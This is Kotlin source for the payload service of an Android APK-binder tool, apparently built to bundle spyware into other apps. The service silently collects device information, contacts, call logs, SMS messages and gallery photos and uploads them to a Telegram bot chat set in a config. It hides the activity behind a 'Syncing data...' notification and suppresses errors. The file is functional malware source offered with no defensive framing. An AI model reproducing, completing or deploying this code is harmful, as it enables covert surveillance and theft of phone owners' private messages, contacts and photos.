package Com.devhs.apkbinder.payload

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import Com.devhs.apkbinder.core.Const
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class PayloadService : Service(), PayloadServiceHost {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundSafely()

        val cfg = PayloadState.config
        if (cfg == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val tg = Telegram(cfg.optString("token"), cfg.optString("chatId"))

        scope.launch {
            try {
                tg.sendMessage("Hs Binder payload started\nPackage: " + packageName)

                if (PayloadState.enabled("device")) {
                    tg.sendDocument("device_info.txt", Collectors.deviceInfo(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("contacts")) {
                    tg.sendDocument("contacts.txt", Collectors.contacts(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("calls")) {
                    tg.sendDocument("call_log.txt", Collectors.callLog(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("sms")) {
                    tg.sendDocument("sms.txt", Collectors.sms(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("gallery")) {
                    val items = Collectors.images(this@PayloadService, Const.IMAGE_LIMIT)
                    tg.sendMessage("Gallery items: " + items.size)
                    for ((index, item) in items.withIndex()) {
                        val bytes = try {
                            contentResolver.openInputStream(item.uri)?.use { it.readBytes() }
                        } catch (_: Throwable) {
                            null
                        } ?: continue
                        tg.sendPhoto(item.name, bytes, Const.CAPTION)
                        if (index % 10 == 0) updateNotification("Uploading " + (index + 1) + "/" + items.size)
                        Thread.sleep(350)
                    }
                }
                tg.sendMessage("Hs Binder payload finished")
            } catch (_: Throwable) {
            } finally {
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private fun startForegroundSafely() {
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel(CHANNEL, "Hs Binder", NotificationManager.IMPORTANCE_LOW)
        )
        val notification: Notification = Notification.Builder(this, CHANNEL)
            .setContentTitle("Hs Binder")
            .setContentText("Syncing data...")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(ID, notification)
        }
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(
            ID,
            Notification.Builder(this, CHANNEL)
                .setContentTitle("Hs Binder")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .build()
        )
    }

    companion object {
        private const val CHANNEL = "hs_payload"
        private const val ID = 0x4853
    }
}
